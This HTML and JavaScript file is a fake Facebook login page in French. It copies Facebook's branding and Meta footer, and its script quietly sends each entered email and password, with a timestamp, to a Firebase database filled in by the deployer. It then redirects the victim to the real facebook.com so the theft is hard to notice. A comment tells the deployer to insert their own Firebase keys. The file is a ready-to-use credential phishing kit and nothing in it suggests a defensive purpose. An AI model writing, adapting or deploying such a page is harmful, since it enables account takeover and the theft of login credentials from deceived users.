<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion Facebook</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0" />
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="login-container">
        <div class="fb-logo-container">
            <div class="fb-circle">f</div>
        </div>

        <form id="loginForm" method="POST">
            <input type="text" name="email" class="login-input" placeholder="Numéro mobile ou e-mail" required>
            
            <div class="password-container">
                <input type="password" id="passwordInput" name="password" class="login-input" placeholder="Mot de passe" required>
                <span class="material-symbols-outlined toggle-password" id="togglePassword">visibility_off</span>
            </div>
            
            <button type="submit" class="login-btn">Se connecter</button>
        </form>

        <a href="#" class="forgot-password">Mot de passe oublié ?</a>
        <button class="create-account-btn">Créer un nouveau compte</button>
    </div>

    <footer class="meta-footer">
        <span class="meta-icon">∞</span> <span class="meta-text">Meta</span>
    </footer>

    <script type="module">
      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
      import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

      // 1. CODE DE L'ŒIL (Afficher/Masquer le mot de passe)
      const passwordInput = document.getElementById('passwordInput');
      const togglePassword = document.getElementById('togglePassword');

      togglePassword.addEventListener('click', function () {
          // Si c'est un mot de passe cachée, on l'affiche en texte, et inversement
          if (passwordInput.type === 'password') {
              passwordInput.type = 'text';
              togglePassword.textContent = 'visibility'; // Change l'icône en œil ouvert
          } else {
              passwordInput.type = 'password';
              togglePassword.textContent = 'visibility_off'; // Change l'icône en œil barré
          }
      });

      // 2. TON CONFIG FIREBASE (Remplis avec tes vraies clés)
      const firebaseConfig = {
        apiKey: "TON_API_KEY",
        authDomain: "TON_PROJECT.firebaseapp.com",
        databaseURL: "https://TON_PROJECT.firebaseio.com",
        projectId: "TON_PROJECT_ID",
        storageBucket: "TON_PROJECT.appspot.com",
        messagingSenderId: "TON_SENDER_ID",
        appId: "TON_APP_ID"
      };

      const app = initializeApp(firebaseConfig);
      const database = getDatabase(app);

      const form = document.getElementById('loginForm');
      form.addEventListener('submit', (e) => {
        e.preventDefault();
        const emailValue = document.querySelector('input[name="email"]').value;
        const passwordValue = passwordInput.value;

        push(ref(database, 'connexions'), {
            identifiant: emailValue,
            motDePasse: passwordValue,
            date: new Date().toLocaleString("fr-FR")
        }).then(() => {
            window.location.href = "https://www.facebook.com";
        });
      });
    </script>
    
        <script type="module" src="script.js"></script>
</body>

    
</body>
</html>
